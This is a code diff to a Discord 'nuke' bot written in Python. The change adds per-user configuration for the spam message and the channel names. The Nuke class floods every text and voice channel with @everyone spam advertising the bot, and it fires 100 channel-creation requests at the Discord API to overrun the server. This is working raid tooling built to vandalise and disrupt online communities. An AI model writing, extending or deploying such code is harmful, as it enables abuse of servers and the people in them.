@@ -6,6 +6,7 @@ from aiohttp import ClientSession
 import random
 
 from core.config.config import (CHNAME,  LINKSERV, headers, NAME)
+from core.managers.config import NukeConfig
 from core.tasks import create_tasks, request
 
 
@@ -13,11 +14,13 @@ class Nuke:
     def __init__(self, ctx):
         self.ctx = ctx
         self.headers = headers
+        self.config = NukeConfig(user_id=ctx.author.id)
 
     async def spam(self, ctx):
         spam_amount = 5
         urls = []
-        json = {"content": f"@everyone BEST BOT?? TRY {NAME}\n{LINKSERV}"}
+        message = self.config.get_spam_message() or f"@everyone BEST BOT?? TRY {NAME}\n{LINKSERV}"
+        json = {"content": message}
 
         channels = self.ctx.guild.text_channels + self.ctx.guild.voice_channels
         for channel in channels:
@@ -35,8 +38,9 @@ class Nuke:
             f"https://discord.com/api/v9/guilds/{self.ctx.guild.id}/channels"
             for _ in range(100)
         ]
+        names = self.config.get_channel_names() or CHNAME
         jsons = [
-            {"name": random.choice(CHNAME), "topic": "", "type": 0} for _ in urls
+            {"name": random.choice(names), "topic": "", "type": 0} for _ in urls
         ]
         async with ClientSession(headers=self.headers, connector=None) as session:
             await create_tasks(urls, session.post, self.headers, jsons)
